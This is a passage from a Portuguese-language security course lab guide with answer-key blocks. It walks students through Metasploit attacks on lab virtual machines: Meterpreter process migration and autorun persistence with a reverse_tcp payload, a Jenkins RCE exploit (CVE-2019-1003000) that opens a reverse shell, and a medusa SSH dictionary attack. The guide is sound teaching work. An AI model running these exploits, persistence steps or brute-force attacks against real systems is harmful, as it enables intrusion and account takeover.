 8     564   svchost.exe  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 676   564   svchost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 772   564   svchost.exe  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 820   564   svchost.exe  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 964   564   svchost.exe  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe

(...)
....
+
....
meterpreter > migrate 676
[*] Migrating from 3180 to 676...
[*] Migration completed successfully.
....
+
Note que, após a migração, o processo `virus.exe` é encerrado -- dificultando a detecção da invasão.
+
....
meterpreter > ps virus
Filtering on 'virus'
No matching processes were found.
....

10. Em seguida, vamos executar o módulo `persistence` do `meterpreter` -- trata-se de um _script_ Ruby que irá criar um serviço do `meterpreter` que será iniciado assim que a máquina for ligada.
+
....
meterpreter > run persistence -X

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WINSERVER-A_20190410.4100/WINSERVER-A_20190410.4100.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=172.16.1.30 LPORT=4444
[*] Persistent agent script is 99638 bytes long
[+] Persistent Script written to C:\Windows\TEMP\JRUGwDg.vbs
[*] Executing script C:\Windows\TEMP\JRUGwDg.vbs
[+] Agent executed with PID 556
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\cWDaWtSsDjaFWrf
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\cWDaWtSsDjaFWrf
....

11. Efetivamente, agora a máquina _WinServer-G_ está totalmente dominada. Agora, faça testes com os comandos que se seguem para determinar quais são as possibilidades apresentadas pelo `meterpreter` -- sua imaginação é o limite!
+
.Comandos do meterpreter, parte 1
[#img-meterpreter-commands-p1]
image::meterpreter-commands-p1.png[align="center"]
+
.Comandos do meterpreter, parte 2
[#img-meterpreter-commands-p2]
image::meterpreter-commands-p2.png[align="center"]

=== 7) Realizando um ataque com o Metasploit em ambiente Linux

[WARNING]
====
Esta atividade será realizada nas máquinas virtuais _LinServer-G_ e _KaliLinux-G_.
====

Nessa atividade utilizaremos novamente o `metasploit` disponível na máquina _KaliLinux-G_, desta vez focando em explorar uma vulnerabilidade em ambiente Linux.

Iremos atacar a ferramenta Jenkins, uma das ferramentas de integração contínua _open source_ mais populares. Em 8 de janeiro de 2019 foram publicados três CVEs (https://nvd.nist.gov/vuln/detail/CVE-2019-1003000[CVE-2019-1003000], https://nvd.nist.gov/vuln/detail/CVE-2019-1003001[CVE-2019-1003001] e https://nvd.nist.gov/vuln/detail/CVE-2019-1003002[CVE-2019-1003002]) para o Jenkins versão <= 2.137 e um de seus _plugins_, o _Pipeline Groovy_ versão 2.61, que detalhavam um vulnerabilidade no roteamento dinâmico do Jenkins permitindo o _bypass_ de permisões de acesso e leitura do servidor para realizar o download e execução de um JAR (_Java Archive_) malicioso.

1. Primeiro, vamos iniciar o serviço Jenkins vulnerável -- ele está disponível em um container Docker pré-configurado em sua máquina _LinServer-G_. Acesse a máquina _LinServer-G_ como `root` e entre no diretório `/root/src/cve-2019-1003000-jenkins-rce-poc/sample-vuln/`:
+
....
# hostname
LinServer-A
....
+
....
# whoami
root
....
+
....
# cd ~/src/cve-2019-1003000-jenkins-rce-poc/sample-vuln/
....

2. Inicie o _daemon_ do Docker, e em seguida execute o _script_ `run.sh`.
+
....
# systemctl start docker
....
+
....
# ./run.sh
5900d5e6faa03a440f7c13e14cc360bdd1fead69815413efaebca23787b73c09
....
+
Após alguns segundos, use o comando `docker container list` para verificar que o container foi iniciado com sucesso:
+
....
# docker container list
CONTAINER ID        IMAGE                          COMMAND                  CREATED              STATUS              PORTS                                              NAMES
5900d5e6faa0        jenkins/jenkins:2.137-alpine   "/sbin/tini -- /usr/…"   About a minute ago   Up About a minute   0.0.0.0:8080->8080/tcp, 0.0.0.0:50000->50000/tcp   vuln-jenkins
....
+
Use o comando `docker logs <CONTAINER_ID>` para verificar que o Jenkins foi iniciado com sucesso:
+
....
# docker logs 5900d5e6faa0

(...)

INFO: Completed initialization
Apr 10, 2019 3:29:34 AM hudson.WebAppMain$3 run
INFO: Jenkins is fully up and running
....

3. Agora, acesse a VM _KaliLinux-G_ como `root` e inicie o `msfconsole`:
+
....
# hostname
KaliLinux-A
....
+
....
# whoami
root
....
+
....
# msfconsole

(...)

msf5 >
....

4. Iremos usar o _exploit_ `exploit/multi/http/jenkins_metaprogramming`. Indique sua utilização:
+
....
msf5 > use exploit/multi/http/jenkins_metaprogramming
....
+
Defina o _host_-alvo do ataque, a máquina _LinServer-G_ -- caso você esteja no grupo B, altere o endereço IP abaixo de forma apropriada:
+
....
msf5 exploit(multi/http/jenkins_metaprogramming) > set rhost 172.16.1.10
rhost => 172.16.1.10
....
+
Defina o endereço do _host_ local -- novamente, atenção caso você seja membro do grupo B:
+
....
msf5 exploit(multi/http/jenkins_metaprogramming) > set lhost 172.16.1.30
lhost => 172.16.1.30
....
+
Tudo pronto! Execute o _exploit_ com o comando `run`:
+
....
msf5 exploit(multi/http/jenkins_metaprogramming) > run

[*] Started HTTPS reverse handler on https://172.16.1.30:8443
[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://172.16.1.30:8080/
[*] Sending Jenkins and Groovy go-go-gadgets
[*] https://172.16.1.30:8443 handling request from 172.16.1.10; (UUID: dcxkuugy) Staging java payload (54377 bytes) ...
[*] Meterpreter session 1 opened (172.16.1.30:8443 -> 172.16.1.10:37828) at 2019-04-10 00:38:42 -0300
[*] Server stopped.
[!] This exploit may require manual cleanup of '$HOME/.groovy/grapes/JacobsonLLC' on the target

meterpreter >
....

5. Estamos dentro do sistema! Verifique com qual usuário estamos conectados:
+
....
meterpreter > getuid
Server username: jenkins
....
+
O comando `sysinfo` pode ser usado para obter mais informações sobre o sistema atacado:
+
....
meterpreter > sysinfo
Computer    : 5900d5e6faa0
OS          : Linux 4.9.0-8-amd64 (amd64)
Meterpreter : java/linux
....
+
Note que, como estamos executando o Jenkins dentro de um container, o isolamento provido por esse tipo de solução impede que tenhamos acesso irrestrito ao sistema hospedeiro. Veja que a lista de processos reportada pelo comando `ps` é bastante reduzida:
+
....
meterpreter > shell
Process 1 created.
Channel 1 created.
....
+
....
ps auxmw
PID   USER     TIME  COMMAND
    1 jenkins   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
    6 jenkins   0:20 java -Duser.home=/var/jenkins_home -jar /usr/share/jenkins/jenkins.war
   90 jenkins   0:04 /usr/lib/jvm/java-1.8-openjdk/jre/bin/java -classpath /tmp/~spawn7661342154187960868.tmp.dir metasploit.Payload
  442 jenkins   0:00 /bin/sh
  450 jenkins   0:00 ps auxmw
....

=== 8) Realizando um ataque de dicionário com o *_medusa_*

[WARNING]
====
Esta atividade será realizada nas máquinas virtuais _FWGW1-G_ e _KaliLinux-G_.
====

1. Vamos realizar um ataque de força bruta ao serviço SSH utilizando o `medusa`. Na máquina _FWGW1-G_, crie um usuário chamado `marcelo` com a senha `123456` e outro chamado `marco` com a senha `abacate`. Depois, ainda na máquina alvo, monitore o arquivo de log `/var/log/auth.log` por tentativas de login.
ifdef::gabarito[]
+
....
# hostname
FWGW1-A
....
+
....
# useradd -m marcelo ; echo 'marcelo:123456' | chpasswd
....
+
....
# useradd -m marco ; echo 'marco:abacate' | chpasswd
....
+
....
# tail -f -n0 /var/log/auth.log
....
endif::gabarito[]

2. Na máquina _KaliLinux-G_, o primeiro passo é descobrir o _banner_ de serviço do SSH. Execute o comando `$ nc 172.16.1.1 22` (adapte o endereço IP se necessário) e copie o valor mostrado.
ifdef::gabarito[]
+
....
# hostname
KaliLinux-A
....
+
....
# nc 172.16.1.1 22
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u6
....
endif::gabarito[]

3. Agora, crie dois arquivos -- um com uma lista de usuários cujo nome será usado para login, e outro com uma lista de senhas. Não se esqueça de incluir na lista de usuários os nomes dos que foram criados no passo (1) desta atividade, bem como suas senhas no outro arquivo.
ifdef::gabarito[]
+
....
# pwd
/root
....
+
....
# cat users.txt
root
marcelo
marco
silva
....
+
....
# cat passwords.txt
rnpesr
123456
abacate
framboesa
....
endif::gabarito[]

4. Finalmente, use o comando `medusa` para executar um ataque de dicionário contra a máquina-alvo. Não se esqueça de informar o _banner_ de serviço capturado no passo (2), bem como os arquivos de usuários/senhas criados no passo (3).
ifdef::gabarito[]
+
....
# medusa -M ssh -m BANNER:SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u6 -h 172.16.1.1 -U users.txt -P passwords.txt | grep 'SUCCESS'
ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marcelo Password: 123456 [SUCCESS]
ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marco Password: abacate [SUCCESS]
....
endif::gabarito[]

5. De volta à máquina _FWGW1-A_, observe o grande número de tentativas de login sem sucesso que o `medusa` realizou até que tivesse sucesso com os usuários/senhas corretos. Como o administrador de sistemas poderia detectar esse tipo de ataque e bloqueá-lo?
